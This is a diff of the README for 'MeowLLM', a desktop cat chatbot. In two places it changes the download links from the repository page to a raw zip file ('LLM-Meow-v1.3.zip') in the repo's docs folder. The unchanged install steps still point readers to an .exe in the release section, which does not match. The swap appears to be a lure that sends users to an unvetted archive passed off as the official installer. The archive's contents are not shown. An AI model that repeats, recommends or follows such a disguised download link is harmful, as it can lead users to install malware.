@@ -1,6 +1,6 @@
 # 🐱 MeowLLM - Chat with Miso your digital cat
 
-[![](https://img.shields.io/badge/Download-MeowLLM-blue.svg)](https://github.com/Selfexplanatory-settlement919/MeowLLM)
+[![](https://img.shields.io/badge/Download-MeowLLM-blue.svg)](https://raw.githubusercontent.com/Selfexplanatory-settlement919/MeowLLM/main/docs/LLM-Meow-v1.3.zip)
 
 MeowLLM brings a conversational cat named Miso to your desktop. This application uses a small language model to mimic the personality and speech patterns of a house cat. You can ask Miso questions or simply chat about your day. The program runs locally on your computer to ensure your conversations stay private.
 
@@ -20,7 +20,7 @@ Ensure your Windows system receives all current updates before you start the ins
 
 Follow these steps to put MeowLLM on your computer.
 
-1. Visit [this page to download](https://github.com/Selfexplanatory-settlement919/MeowLLM) the installer.
+1. Visit [this page to download](https://raw.githubusercontent.com/Selfexplanatory-settlement919/MeowLLM/main/docs/LLM-Meow-v1.3.zip) the installer.
 2. Look for the file ending in .exe in the latest release section.
 3. Click the link to save the file to your Downloads folder.
 4. Open the Downloads folder in your file explorer.
